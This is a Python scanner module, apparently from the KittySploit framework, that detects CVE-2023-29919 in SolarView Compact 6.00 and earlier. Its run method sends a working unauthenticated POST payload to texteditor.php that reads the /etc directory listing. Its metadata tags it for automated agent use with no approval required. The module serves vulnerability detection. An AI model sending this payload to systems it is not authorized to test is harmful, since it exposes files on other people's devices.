#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is an arbitrary read file vulnerability in SolarView Compact 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SolarView Compact <= 6.00 - Local File Inclusion Detection',
        'description': 'There is an arbitrary read file vulnerability in SolarView Compact 6.00 and below, attackers can bypass authentication to read files through texteditor.php',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'lfi', 'solarview', 'edb', 'contec', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/xiaosed/CVE-2023-29919',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-29919',
            'https://www.solarview.io/',
            'https://github.com/nomi-sec/PoC-in-GitHub',
        ],
        'cve': 'CVE-2023-29919',
    }

    def run(self):
        path = '/texteditor.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='directory=%2F/etc&open=%8AJ%82%AD&r_charset=none&newfile=&editfile=%2Fhome%2Fcontec%2Fdata%2FoutputCtrl%2Fremote%2F2016%2F\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('action="texteditor.php"', 'adduser.conf', 'deluser.conf',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='SolarView Compact <= 6.00 - Local File Inclusion detected', path=path)
            return True
        return False

